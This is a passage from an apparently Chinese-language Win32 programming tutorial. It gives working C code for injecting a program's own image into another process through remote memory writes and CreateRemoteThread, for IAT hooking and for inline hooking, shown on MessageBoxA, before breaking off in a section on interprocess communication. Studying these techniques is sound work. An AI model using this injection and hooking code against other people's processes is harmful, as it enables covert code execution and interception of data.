pImageDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;<br>PIMAGE_NT_HEADERS pImageNTHeader = (PIMAGE_NT_HEADERS) ((DWORD) pImageBuffer + pImageDosHeader-&gt;e_lfanew);<br>PIMAGE_FILE_HEADER pImagePEHeader = (PIMAGE_FILE_HEADER) (((DWORD) pImageNTHeader) + <span class="hljs-number">4</span>);<br>PIMAGE_OPTIONAL_HEADER pImageOptionHeader = (PIMAGE_OPTIONAL_HEADER) ((DWORD) pImagePEHeader + IMAGE_SIZEOF_FILE_HEADER);<br><span class="hljs-comment">// 修复IAT表</span><br><br><br><span class="hljs-comment">// 根据注入的EXE的导入表和当前被注入的EXE的环境，修复IAT表</span><br>DWORD dwImageBase = pImageOptionHeader-&gt;ImageBase;<br>LPVOID pImportDir = (LPVOID)(pImageOptionHeader-&gt;DataDirectory[<span class="hljs-number">1</span>].VirtualAddress + pImageOptionHeader-&gt;ImageBase);<br><br><span class="hljs-comment">// 解析导入表</span><br>PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR) pImportDir;<br><span class="hljs-comment">//遍历数据并找到 IMAGE_IMPORT_DESCRIPTOR 的数目</span><br><span class="hljs-comment">// 检查每一个字节</span><br><span class="hljs-type">int</span> num = <span class="hljs-number">0</span>;<br>BOOL break_flag = FALSE;<br>PIMAGE_IMPORT_DESCRIPTOR pTemp = pImportDescriptor;<br>DWORD procAddress;<br><span class="hljs-keyword">while</span> (pTemp-&gt;Name != <span class="hljs-literal">NULL</span>) &#123;<br>num++;<br>pTemp++;<br>&#125;<br><span class="hljs-comment">// 遍历并处理每一块</span><br>pTemp = pImportDescriptor;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; j++) &#123;<br><span class="hljs-comment">// DLL的名字</span><br><span class="hljs-type">char</span> *dll_name = (<span class="hljs-type">char</span> *) (dwImageBase + (pTemp + j)-&gt;Name);<br><span class="hljs-comment">//printf(&quot;%s :\n&quot;, dll_name);</span><br><span class="hljs-comment">//printf(&quot;----------------------------\n&quot;);</span><br><br><span class="hljs-comment">// INT表</span><br>PIMAGE_THUNK_DATA pThunkName = (PIMAGE_THUNK_DATA) (dwImageBase + (pTemp + j)-&gt;OriginalFirstThunk);<br><span class="hljs-comment">// IAT表</span><br>PIMAGE_THUNK_DATA pThunkProcAddress = (PIMAGE_THUNK_DATA) (dwImageBase + (pTemp + j)-&gt;FirstThunk);<br><br>PIMAGE_IMPORT_BY_NAME pImageImportByName = (PIMAGE_IMPORT_BY_NAME) (dwImageBase + pThunkName-&gt;u1.Ordinal);<br><span class="hljs-comment">// 获取该DLL的函数名或者序号名</span><br><span class="hljs-keyword">while</span> (TRUE) &#123;<br><span class="hljs-keyword">if</span> ((pThunkName-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG) == <span class="hljs-number">0</span>) <span class="hljs-comment">// the highest bit is 0</span><br>&#123; <span class="hljs-comment">// 此时是名称导入方式，需要获取导入DLL中的函数名</span><br>pImageImportByName = (PIMAGE_IMPORT_BY_NAME) (dwImageBase +  pThunkName-&gt;u1.Ordinal);<br><span class="hljs-comment">//printf(&quot;%s\n&quot;, pImageImportByName-&gt;Name);</span><br><span class="hljs-comment">// 得到地址</span><br>procAddress =  (DWORD)GetProcAddress(LoadLibrary(dll_name),pImageImportByName-&gt;Name);<br><br><span class="hljs-comment">// 修复</span><br>pThunkProcAddress-&gt;u1.Ordinal = procAddress;<br>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">//The highest bit is 1</span><br><span class="hljs-comment">// 此时是序号导入方式，需要获取导入DLL中的序号</span><br>DWORD dwOrdinal = ((pThunkName-&gt;u1.Ordinal &lt;&lt; <span class="hljs-number">1</span>) &gt;&gt; <span class="hljs-number">1</span>);<br><span class="hljs-comment">//printf(&quot;Import by ordinal: %lx\n&quot;, dwOrdinal);</span><br>procAddress = (DWORD)GetProcAddress(LoadLibrary(dll_name),(LPCSTR)dwOrdinal);<br><br><span class="hljs-comment">// 修复</span><br>pThunkProcAddress-&gt;u1.Ordinal = procAddress;<br>&#125;<br>pThunkName++;<br>pThunkProcAddress++;<br><span class="hljs-keyword">if</span> (pThunkName-&gt;u1.Ordinal == <span class="hljs-number">0</span>) &#123; <span class="hljs-keyword">break</span>; &#125;<br>&#125;<br>&#125;<br><br><br><br><span class="hljs-comment">// 跳转到A的入口处执行</span><br>DWORD dwOEPAddr = pImageOptionHeader-&gt;ImageBase + pImageOptionHeader-&gt;AddressOfEntryPoint;<br>HANDLE hThread = CreateThread(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (PTHREAD_START_ROUTINE)dwOEPAddr,<span class="hljs-literal">NULL</span> , <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;AnotherThread running...\n&quot;</span>);<br>WaitForSingleObject(hThread, INFINITE);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">// 需要注入的进程ID</span><br>DWORD dwInjectedPid = <span class="hljs-number">880</span>;<br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, _TCHAR* argv[])<br>&#123;<br>DWORD dwCurrentPid = GetCurrentProcessId();<br><span class="hljs-comment">// 正确注入，执行代码</span><br><span class="hljs-keyword">if</span> (dwCurrentPid == dwInjectedPid )<br>&#123;<br>TestSuccess();<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><br><span class="hljs-comment">//1、获取自身句柄</span><br>DWORD dwImageAddr = (DWORD)::GetModuleHandle(<span class="hljs-literal">NULL</span>);<br><br><span class="hljs-comment">// 2、获得自身的ImageBase/SizeOfImage</span><br>PIMAGE_DOS_HEADER pSelfDosHeader  = (PIMAGE_DOS_HEADER)dwImageAddr;<br>PIMAGE_NT_HEADERS pSelfNTHeader = (PIMAGE_NT_HEADERS) (dwImageAddr + pSelfDosHeader-&gt;e_lfanew);;<br>PIMAGE_FILE_HEADER pSelfPEHeader = (PIMAGE_FILE_HEADER) (((DWORD) pSelfNTHeader) + <span class="hljs-number">4</span>);;<br>PIMAGE_OPTIONAL_HEADER pSelfOptionHeader = (PIMAGE_OPTIONAL_HEADER) ((DWORD) pSelfPEHeader + IMAGE_SIZEOF_FILE_HEADER);<br><br>DWORD dwSelfImageBase = pSelfOptionHeader-&gt;ImageBase;<br>DWORD dwSelfImageSize = pSelfOptionHeader-&gt;SizeOfImage;<br><br><span class="hljs-comment">//3、创建一个新的缓冲区，将自己复制进去</span><br>pImageBuffer = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,dwSelfImageSize);<br>ReadProcessMemory(GetCurrentProcess(),(LPCVOID)dwSelfImageBase,pImageBuffer,dwSelfImageSize,<span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//4、打开要注入的A进程</span><br>HANDLE hInjectProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwInjectedPid);<br><span class="hljs-keyword">if</span> (hInjectProcess == <span class="hljs-literal">NULL</span>)<br>&#123;<br>OutputDebugString(<span class="hljs-string">&quot;进程不存在！&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">//5、在A进程中申请内存，大小就是SizeOfImage</span><br>LPVOID lpAllocAddr = VirtualAllocEx(hInjectProcess, <span class="hljs-literal">NULL</span>, dwSelfImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br><br><span class="hljs-comment">//6、根据B的重定位表修复值</span><br><br><span class="hljs-comment">// 改掉ImageBase</span><br>PIMAGE_DOS_HEADER pSelfImageDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;<br>PIMAGE_NT_HEADERS pSelfImageNTHeader = (PIMAGE_NT_HEADERS) ((DWORD) pImageBuffer + pSelfImageDosHeader-&gt;e_lfanew);<br>PIMAGE_FILE_HEADER pSelfImagePEHeader = (PIMAGE_FILE_HEADER) (((DWORD) pSelfImageNTHeader) + <span class="hljs-number">4</span>);<br>PIMAGE_OPTIONAL_HEADER pSelfImageOptionHeader = (PIMAGE_OPTIONAL_HEADER) ((DWORD) pSelfImagePEHeader + IMAGE_SIZEOF_FILE_HEADER);<br>DWORD dwOriginalImageBase = pSelfImageOptionHeader-&gt;ImageBase;<br>pSelfImageOptionHeader-&gt;ImageBase =(DWORD)lpAllocAddr;<br><br><br>PIMAGE_BASE_RELOCATION pReloc = (PIMAGE_BASE_RELOCATION)((DWORD)pImageBuffer + pSelfImageOptionHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);<br><br><span class="hljs-comment">// 计算delta</span><br>DWORD dwDelta;<br>dwDelta = (DWORD)lpAllocAddr - dwOriginalImageBase;<span class="hljs-comment">//实际的imageBase减去pe文件里面标识的imagebase得到“移动的距离”</span><br><span class="hljs-comment">//判断是否有重定位表</span><br><span class="hljs-keyword">if</span> ((<span class="hljs-type">char</span>*)pReloc != (<span class="hljs-type">char</span>*)pImageBuffer)<br>&#123;<br><span class="hljs-keyword">while</span> ((pReloc-&gt;VirtualAddress + pReloc-&gt;SizeOfBlock) != <span class="hljs-number">0</span>) <span class="hljs-comment">//开始扫描重定位表</span><br>&#123;<br>WORD* pLocData = (WORD*)((PBYTE)pReloc + <span class="hljs-keyword">sizeof</span>(IMAGE_BASE_RELOCATION));<br><span class="hljs-comment">//计算需要修正的重定位项（地址）的数目</span><br><span class="hljs-type">int</span> nNumberOfReloc = (pReloc-&gt;SizeOfBlock - <span class="hljs-keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="hljs-keyword">sizeof</span>(WORD);<br><br>DWORD* pAddress;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nNumberOfReloc; i++)<br>&#123;<br><br><span class="hljs-keyword">if</span> ((DWORD)(pLocData[i] &amp; <span class="hljs-number">0x0000F000</span>) == <span class="hljs-number">0x00003000</span>) <span class="hljs-comment">//这是一个需要修正的地址</span><br>&#123;<br>pAddress = (DWORD*)((PBYTE)pImageBuffer + pReloc-&gt;VirtualAddress + (pLocData[i] &amp; <span class="hljs-number">0x0FFF</span>));<br>*pAddress += dwDelta;<span class="hljs-comment">//把移动的距离在原地址加上去</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">//转移到下一个节进行处理</span><br>pReloc = (PIMAGE_BASE_RELOCATION)((PBYTE)pReloc + pReloc-&gt;SizeOfBlock);<br>&#125;<br>&#125;<br><br><br><span class="hljs-comment">//7、将修复后的数据，复制到A的内存中</span><br>WriteProcessMemory(hInjectProcess, lpAllocAddr, pImageBuffer, dwSelfImageSize, <span class="hljs-literal">NULL</span>);<br><span class="hljs-comment">//8、创建一个远程线程，执行Entry</span><br>DWORD dwFixedEntry = (DWORD)Entry + dwDelta;<br>HANDLE hThread = CreateRemoteThread(hInjectProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)dwFixedEntry, lpAllocAddr, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>WaitForSingleObject(hThread, INFINITE);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="基本HOOK方式（3环HOOK）"><a href="#基本HOOK方式（3环HOOK）" class="headerlink" title="基本HOOK方式（3环HOOK）"></a>基本HOOK方式（3环HOOK）</h1><blockquote><p>Hook技术被广泛应用于安全的多个领域，比如杀毒软件的主动防御功能，涉及到对一些敏感API的监控，就需要对这些API进行Hook；窃取密码的木马病毒，为了接收键盘的输入，需要Hook键盘消息；甚至是Windows系统及一些应用程序，在打补丁时也需要用到Hook技术</p></blockquote><h2 id="IAT-HOOK"><a href="#IAT-HOOK" class="headerlink" title="IAT HOOK"></a>IAT HOOK</h2><p>我们都知道几乎所有的PE文件都需要外部模块提供的函数，这些函数的信息存储在导入表IAT中，将IAT表中的信息修改为指定函数的地址即可达到HOOK的效果。</p><p>IAT HOOK的代码十分地精简，主要函数如下，它的功能是修改IAT表中的值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c">HMODULE hModule = GetModuleHandle(_T(<span class="hljs-string">&quot;user32.dll&quot;</span>));<br>DWORD dwOldProcAddr = (DWORD)GetProcAddress(hModule, _T(<span class="hljs-string">&quot;MessageBoxA&quot;</span>));<br><br><br><span class="hljs-comment">// 传入参数为IAT表中原先的值和需要修改的值</span><br>BOOL <span class="hljs-title function_">SetIATHook</span><span class="hljs-params">(DWORD dwOldAddr, DWORD dwNewAddr)</span>&#123;<br>init();<br>PIMAGE_IMPORT_DESCRIPTOR pImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR) pImportDir;<br><span class="hljs-keyword">while</span> (pImportDescriptor-&gt;FirstThunk != <span class="hljs-number">0</span> &amp;&amp; g_bIATHookFlag != <span class="hljs-number">1</span>) &#123;<br>pFuncAddr = (PDWORD) (dwImageAddr + pImportDescriptor-&gt;FirstThunk);<br><span class="hljs-keyword">while</span> (*pFuncAddr)&#123;<br><span class="hljs-keyword">if</span> (*pFuncAddr == dwOldAddr) &#123;<br>*pFuncAddr = dwNewAddr;<br>g_bIATHookFlag = TRUE;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br>pFuncAddr ++ ;<br>&#125;<br>pImportDescriptor ++ ;<br>&#125;<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br>BOOL <span class="hljs-title function_">UnsetIATHook</span><span class="hljs-params">(DWORD dwOldAddr)</span><br>&#123;<br>*pFuncAddr = dwOldAddr;<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br>DWORD <span class="hljs-title function_">GetFuncAddr</span><span class="hljs-params">(DWORD dwFuncAddr)</span>&#123;<br>DWORD dwOffset = *(PDWORD)((PBYTE)dwFuncAddr + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">return</span> dwFuncAddr + <span class="hljs-number">5</span> + dwOffset;<br>&#125;<br><br><br><span class="hljs-comment">// 0x411810</span><br>DWORD WINAPI <span class="hljs-title function_">MyMessageBox</span><span class="hljs-params">(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)</span>&#123;<br><span class="hljs-comment">// 定义MessageBox 函数指针</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-title function_">DWORD</span> <span class="hljs-params">(WINAPI *pfnMessageBox)</span><span class="hljs-params">(HWND _hWnd, LPCSTR _lpText, LPCSTR _lpCaption, UINT _uType)</span>;<br><br><span class="hljs-comment">// 获取参数</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;参数： %x %s %s %x\n&quot;</span>,hWnd, lpText, lpCaption, uType);<br><span class="hljs-comment">// 执行真正的函数</span><br><span class="hljs-type">int</span> ret = ((pfnMessageBox)dwOldProcAddr)(hWnd, lpText, lpCaption, uType);<br><span class="hljs-comment">// 获取返回值</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;返回值： %x\n&quot;</span>,ret);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br>VOID <span class="hljs-title function_">TestIATHook</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-comment">//安装IAT Hook</span><br>BOOL bSuccess = SetIATHook(dwOldProcAddr,GetFuncAddr((DWORD)MyMessageBox));<br><br><span class="hljs-keyword">if</span> (bSuccess)&#123;<br>MessageBox(<span class="hljs-literal">NULL</span>,_T(<span class="hljs-string">&quot;测试IAT Hook&quot;</span>), _T(<span class="hljs-string">&quot;IAT Hook&quot;</span>), MB_OK);<br><br><span class="hljs-comment">//卸载IAT Hook</span><br>UnsetIATHook(dwOldProcAddr);<br>&#125;<br><br>&#125;<br><br><span class="hljs-type">int</span> _tmain(<span class="hljs-type">int</span> argc, _TCHAR* argv[])&#123;<br><br>TestIATHook();<br><span class="hljs-comment">//TestInlineHook();</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里的GetFuncAddr函数是为了获得函数的地址。虽然也可以通过直接反汇编看函数的代码来看，但是这种方式重新编译后就可能会发生变化，比较不方便。</p><p>简单地将函数名转成DWORD也是不行的，原因如下图，有个jmp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL bSuccess = SetIATHook(dwOldProcAddr,(DWORD)MyMessageBox); <span class="hljs-comment">// 不行</span><br></code></pre></td></tr></table></figure><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20220215162358338.png" alt="image-20220215162358338"></p><p>运行结果：</p><p>简单地打印了一下参数和返回值</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20220215225404864.png" alt="image-20220215225404864"></p><h2 id="Inline-HOOK"><a href="#Inline-HOOK" class="headerlink" title="Inline HOOK"></a>Inline HOOK</h2><p>Inline HOOK更将简单粗暴一些，通过直接修改硬编码达到函数跳转的效果。</p><p>Inline HOOK实现的关键是如何保存原来线程的CONTEXT环境，以及被覆盖的硬编码的保存与执行问题。</p><p>对于第一个问题，我们可以定义一个Register类来保存原来线程的CONTEXT环境：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">REGISTER</span>&#123;</span><br>DWORD Eax;<br>DWORD Ebx;<br>DWORD Ecx;<br>DWORD Edx;<br>DWORD Esi;<br>DWORD Edi;<br>DWORD Esp;<br>DWORD Ebp;<br>&#125;Register;<br></code></pre></td></tr></table></figure><p>同时在我们的HOOK函数中用相应的汇编代码保存现场：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(naked) <span class="hljs-type">void</span> <span class="hljs-title function_">HookProc</span><span class="hljs-params">()</span>&#123;<br><span class="hljs-comment">// 保存寄存器</span><br>_asm<br>&#123;<br>pushad<br>pushfd<br>&#125;<br><br><span class="hljs-comment">// 获取数据</span><br>_asm<br>&#123;<br>mov reg.Eax, eax<br>mov reg.Ebx, ebx<br>mov reg.Ecx, ecx<br>mov reg.Edx, edx<br>mov reg.Esi, esi<br>mov reg.Edi, edi<br>mov reg.Esp, esp<br>mov reg.Ebp, ebp<br>&#125;<br><br>    <br>    <span class="hljs-comment">//要做的事代码写这</span><br><br>    <br><span class="hljs-comment">// 恢复寄存器</span><br>_asm<br>&#123;<br>popfd<br>popad<br>&#125;<br><br><span class="hljs-comment">// 跳到存储的CodePatch处</span><br>_asm<br>&#123;<br>jmp g_pOldProcAddr;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>对于第二个问题，这里直接给出代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c">BOOL g_bHookSuccessFlag = FALSE;<br>PBYTE g_pCodePatch;<br><br><span class="hljs-comment">// dwHookAddr : 安装Hook的地址</span><br><span class="hljs-comment">// dwProcAddr ：真正需要执行的函数地址</span><br>BOOL <span class="hljs-title function_">SetInlineHook</span><span class="hljs-params">(DWORD dwHookAddr, DWORD dwProcAddr, DWORD dwLength, PBYTE* pOldCode)</span>&#123;<br>BOOL bRet;<br><br>DWORD dwJmpCode;<br><span class="hljs-comment">// 参数校验</span><br><span class="hljs-keyword">if</span> (dwHookAddr == <span class="hljs-literal">NULL</span> || dwProcAddr == <span class="hljs-literal">NULL</span>)&#123;<br>OutputDebugString(<span class="hljs-string">&quot;SetInlineHook函数执行失败：Hook地址/函数地址填写有误！&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 长度不能小于5</span><br><span class="hljs-keyword">if</span> (dwLength &lt; <span class="hljs-number">5</span>)&#123;<br>OutputDebugString(<span class="hljs-string">&quot;SetInlineHook函数执行失败：修改的硬编码长度不能小于5！&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 将要Hook的内存修改为可写</span><br>DWORD dwOldProtectionFlag;<br>bRet = VirtualProtectEx(::GetCurrentProcess(),(LPVOID)dwHookAddr,dwLength,PAGE_EXECUTE_READWRITE,&amp;dwOldProtectionFlag);<br><span class="hljs-keyword">if</span> (!bRet)&#123;<br>OutputDebugString(<span class="hljs-string">&quot;SetInlineHook函数执行失败：修改内存属性失败！&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><span class="hljs-comment">// 申请一块有执行权限的虚拟内存，存储原来的硬编码</span><br><span class="hljs-comment">// +5 是为了预留空间嵌入机器码跳回原来的地址</span><br>LPVOID pAllocAddr = VirtualAllocEx(::GetCurrentProcess(),<span class="hljs-literal">NULL</span>,dwLength + <span class="hljs-number">5</span>, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);<br><span class="hljs-built_in">memcpy</span>(pAllocAddr,(LPVOID)dwHookAddr,dwLength);<br><span class="hljs-comment">// 设置跳回并执行原来的地址</span><br>*(PBYTE)((DWORD)pAllocAddr + dwLength) = <span class="hljs-number">0xE9</span>;<br><span class="hljs-comment">// 要跳转到的地址 = E9的地址 + 5 + E9后面的值</span><br><span class="hljs-comment">// --&gt; E9后面的值 = 要跳转到的地址 - 5 - E9的地址</span><br>*(PDWORD)((DWORD)pAllocAddr + dwLength +<span class="hljs-number">1</span>) = dwHookAddr + dwLength - ((DWORD)pAllocAddr + dwLength) - <span class="hljs-number">5</span>;<br><span class="hljs-comment">// 将pAllocAddr的地址传递出去，它将会在HookProc函数的最后得到使用</span><br>*pOldCode = (PBYTE)pAllocAddr;<br><br><span class="hljs-comment">// 跳转到dwProcAddr</span><br><span class="hljs-comment">// 要跳转到的地址 = E9的地址 + 5 + E9后面的值</span><br><span class="hljs-comment">// --&gt; E9后面的值 = 要跳转到的地址 - 5 - E9的地址</span><br>dwJmpCode = dwProcAddr - dwHookAddr - <span class="hljs-number">5</span>;<br><br><span class="hljs-comment">// 将要Hook的内存首先全部设置为NOP</span><br><span class="hljs-built_in">memset</span>((PBYTE)dwHookAddr,<span class="hljs-number">0x90</span>,dwLength);<br><br><span class="hljs-comment">// 修改要Hook的内存的硬编码</span><br>*(PBYTE)dwHookAddr = <span class="hljs-number">0xE9</span>;<br>*(PDWORD)((PBYTE)dwHookAddr + <span class="hljs-number">1</span>) = dwJmpCode;<br><br><span class="hljs-comment">// 修改被Hook的状态</span><br>g_bHookSuccessFlag = TRUE;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br>BOOL <span class="hljs-title function_">UnsetInlineHook</span><span class="hljs-params">(DWORD dwHookAddr, DWORD dwPatchAddr, DWORD dwLength)</span>&#123;<br><span class="hljs-keyword">if</span> (g_bHookSuccessFlag)&#123;<br><span class="hljs-built_in">memcpy</span>((LPVOID)dwHookAddr,(LPVOID)dwPatchAddr,dwLength);<br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>OutputDebugString(<span class="hljs-string">&quot;没有Hook成功，无需恢复！&quot;</span>);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在安装InlineHook后，函数的执行流程变成了下面这种方式：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20220215224714071.png" alt="image-20220215224714071"></p><p>运行结果：</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20220218161715304.png" alt="image-20220218161715304"></p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/02/img/Win32.assets/image-20220218161725298.png" alt="image-20220218161725298"></p><h1 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h1><p>进程通信的方式有很多，包括文件读写、自定义消息、文件映射、共享内存、管道（匿名&#x2F;命名）等。</p><p>我们之前提到的信号量等进程同步机制也同样可以用于进程间的通信。</p><p>下面给出几种进程通信的Demo。</p><h2 id="自定义消息"><a href="#自定义消息" class="headerlink" title="自定义消息"></a>自定义消息</h2><p>在Windows的消息机制中，消息的种类是有限的。最后一种消息是<code>wm_user</code>（0x0400），这意味着往后就是Windows未使用的消息编号，我们可以使用其来传递消息。</p><h3 id="发送端代码"><a href="#发送端代码" class="headerlink" title="发送端代码"></a>发送端代码</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">HWND hwnd = ::FindWindow(<span class="hljs-literal">NULL</span>,TEXT(<span class="hljs-string">&quot;接收端窗口名&quot;</span>));<br><span class="hljs-keyword">if</span>(hwnd == <span class="hljs-literal">NULL</span>)<br>&#123;<br>MessageBox(<span class="hljs-number">0</span>,TEXT(<span class="hljs-string">&quot;没找到窗口&quot;</span>),TEXT(<span class="hljs-string">&quot;ERROR&quot;</span>),MB_OK);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-comment">// 发送消息  </span><br><span 